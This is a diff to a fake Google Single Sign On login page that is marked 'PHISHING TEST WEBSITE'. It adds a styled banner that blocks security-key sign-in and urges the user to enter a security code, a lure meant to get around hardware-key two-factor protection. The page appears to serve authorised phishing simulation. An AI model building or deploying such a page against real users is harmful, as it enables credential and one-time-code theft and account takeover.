@@ -1,6 +1,8 @@
 <!--googleoff: all--><html lang="en"><head><title>Google Single Sign On: Sign into corp</title>
 <link rel="icon" href="favicon.ico" type="image/x-icon">
 <link href="css/login.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
 <script type="text/javascript" src="js/gnubbyloginscript.js" nonce="">
           
         </script>
@@ -20,8 +22,11 @@
           }
           f.addEventListener('submit', function(e) {
 			e.preventDefault();
-            alert("Use the security code instead of the security Key to complete the verification!")
+            document.getElementById("verificationBanner").style.display="flex";
           });
+		  document.getElementById("crossVerification").addEventListener("click",function(){
+			document.getElementById("verificationBanner").style.display="none";
+		  });
         });
 
       </script>
@@ -305,4 +310,9 @@ google.com
         document.getElementById('waitfortouch').setAttribute('aria-hidden', 'true');
 </script>
 <div>PHISHING TEST WEBSITE</div>	  
+	  
+<div id="verificationBanner" style="position:absolute;padding:20px;left:50%;top:50%;translate:-50% -50%;z-index:20;margin-top:20px;display:none;width:300px;height:80px;background:orange;align-items:center;justify-content:center;color:white;">
+	<b>Use the security code instead of the security Key to complete the verification!</b>
+	<i class="fa-solid fa-xmark" style="color:black;position:absolute;top:10px;right:10px;cursor:pointer" id="crossVerification"></i>
+</div>
 	  </body></html>
